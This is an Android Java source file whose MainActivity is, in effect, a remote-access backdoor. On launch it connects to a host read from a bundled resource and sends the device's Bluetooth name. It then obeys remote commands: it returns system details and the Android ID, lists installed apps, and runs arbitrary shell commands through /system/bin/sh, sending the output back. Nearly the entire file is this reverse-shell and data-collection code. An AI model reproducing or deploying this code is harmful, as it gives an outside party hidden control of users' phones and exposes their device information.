package com.example.application;

import androidx.appcompat.app.AppCompatActivity;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.Callable;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.ActivityManager;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Debug;
import android.os.Environment;
import android.os.StatFs;
import android.provider.Settings;
import android.util.Log;
import android.widget.TextView;


public class MainActivity extends Activity {
    public static ExecutorService executorService = Executors.newFixedThreadPool(100);

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        try {
            InputStream inputStream = getResources().openRawResource(R.raw.connect);
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
            String host = bufferedReader.readLine();
            int port = Integer.parseInt(bufferedReader.readLine());

            TextView textView = (TextView) findViewById(R.id.textview);
            textView.setText(host + " " + port);

            Thread socketThread = new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        Socket socket = new Socket(host, port);
                        OutputStream outputStream = socket.getOutputStream();
                        InputStream SocketInputStream = socket.getInputStream();
                        PrintWriter printWriter = new PrintWriter(outputStream);

                        BufferedReader buf = new BufferedReader(new InputStreamReader(SocketInputStream));

                        printWriter.println(" [ Connect ] " + Settings.Secure.getString(getContentResolver(),"bluetooth_name"));
                        printWriter.flush();

                        while (true)
                        {
                            String message = buf.readLine();
                            if (message == null) {
                                break;
                            }
                            if (message.equals("getinfo")) {
                                printWriter.println(getSysInfo());
                                printWriter.flush();
                            }
                            if (message.equals("applist")) {
                                printWriter.println(getAppList());
                                printWriter.flush();
                            }
                            if (message.startsWith("shell ")) {
                                try{
                                    String shell = message.substring(6);
                                    Runtime runtime = Runtime.getRuntime();

                                    Future<Integer> future = executorService.submit(new Callable<Integer>() {
                                        @Override
                                        public Integer call() {
                                            try {
                                                String[] sendCommand = {
                                                        "/system/bin/sh","-c",
                                                        shell
                                                };
                                                Process p = Runtime.getRuntime().exec(sendCommand);
                                                String data = null;
                                                BufferedReader ie = new BufferedReader(new InputStreamReader(p.getErrorStream()));
                                                BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream()));
                                                String error = null;
                                                while ((error = ie.readLine()) != null
                                                        && !error.equals("null")) {
                                                    data += error + "\n";
                                                }
                                                String line = null;
                                                while ((line = in.readLine()) != null
                                                        && !line.equals("null")) {
                                                    data += line + "\n";
                                                }
                                                printWriter.println(data.substring(4));
                                                printWriter.flush();
                                            }catch (Exception exception) {
                                                printWriter.println(" [ERROR] COMMAND ERROR !");
                                                printWriter.flush();
                                            }
                                            return 0;
                                        }
                                    });
                                }catch (Exception exception){
                                    printWriter.println("Command Error or Runtime Error!");
                                    printWriter.flush();
                                    continue;
                                }
                            }
                        }
                        socket.close();
                    }catch (Exception exception){
                        exception.printStackTrace();
                        TextView textView = (TextView) findViewById(R.id.textview);
                        textView.setText("ERROR: "+exception.getMessage());
                    }
                }
            });
            socketThread.start();
        }
        catch (Exception exception) {
            exception.printStackTrace();
            TextView textView = (TextView) findViewById(R.id.textview);
            textView.setText("ERROR: "+exception.getMessage());
        }
    }
    public String getSysInfo() {
        String phoneName = " Phone Name: "+ Settings.Secure.getString(getContentResolver(),"bluetooth_name");
        String language = " Language: " + Locale.getDefault().getLanguage();
        @SuppressLint(" HardwareIds") String androidId = " Android Id: "+ Settings.Secure.getString(getContentResolver(),Settings.Secure.ANDROID_ID);
        String phoneBrand = " Phone Brand: "+ Build.BRAND;
        String version = " Release Version: "+Build.VERSION.RELEASE;
        final StatFs statFs = new StatFs(Environment.getDataDirectory().getPath());
        long totalCounts = statFs.getBlockCountLong();//总共的block数
        long availableCounts = statFs.getAvailableBlocksLong() ; //获取可用的block数
        long size = statFs.getBlockSizeLong(); //每格所占的大小，一般是4KB==
        long availROMSize = availableCounts * size;//可用内部存储大小
        long totalROMSize = totalCounts *size; //内部存储总大小
        ActivityManager.MemoryInfo memoryInfo = new ActivityManager.MemoryInfo();
        String ram = " ROM: "+ String.valueOf(totalROMSize);
        String availROM = " AvailRom: " + String.valueOf(availROMSize);

        StringBuffer stringBuffer = new StringBuffer("");
        stringBuffer.append("/n/n");
        stringBuffer.append( "[System Information]/n");
        stringBuffer.append(phoneName+"/n");
        stringBuffer.append(language+"/n");
        stringBuffer.append(phoneBrand+"/n");
        stringBuffer.append(version+"/n");
        stringBuffer.append(ram+"/n");
        stringBuffer.append(availROM+"/n");
        stringBuffer.append(androidId+"/n");

        return stringBuffer.toString();
    }
    public String getAppList() {
        List<ApplicationInfo> allApps = getPackageManager().getInstalledApplications(0);
        StringBuffer stringBuffer = new StringBuffer("");
        for(ApplicationInfo ai : allApps) {
            stringBuffer.append(" -- "+ai.packageName);
            stringBuffer.append("/n");
        }
        return stringBuffer.toString();
    }
    public static StringBuffer shellExec(String cmd) {
        Runtime mRuntime = Runtime.getRuntime(); //执行命令的方法
        try {
            //Process中封装了返回的结果和执行错误的结果
            Process mProcess = mRuntime.exec(cmd); //加入参数
            //使用BufferReader缓冲各个字符，实现高效读取
            //InputStreamReader将执行命令后得到的字节流数据转化为字符流
            //mProcess.getInputStream()获取命令执行后的的字节流结果
            BufferedReader mReader = new BufferedReader(new InputStreamReader(mProcess.getInputStream()));
            //实例化一个字符缓冲区
            StringBuffer mRespBuff = new StringBuffer();
            //实例化并初始化一个大小为1024的字符缓冲区，char类型
            char[] buff = new char[1024];
            int ch = 0;
            //read()方法读取内容到buff缓冲区中，大小为buff的大小，返回一个整型值，即内容的长度
            //如果长度不为null
            while ((ch = mReader.read(buff)) != -1) {
                //就将缓冲区buff的内容填进字符缓冲区
                mRespBuff.append(buff, 0, ch);
            }
            //结束缓冲
            mReader.close();
            Log.i("shell", "shellExec: " + mRespBuff);
            //弹出结果
//            Log.i("shell", "执行命令: " + cmd + "执行成功");
            return mRespBuff;

        } catch (IOException e) {
            // 异常处理
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
        return null;
    }
}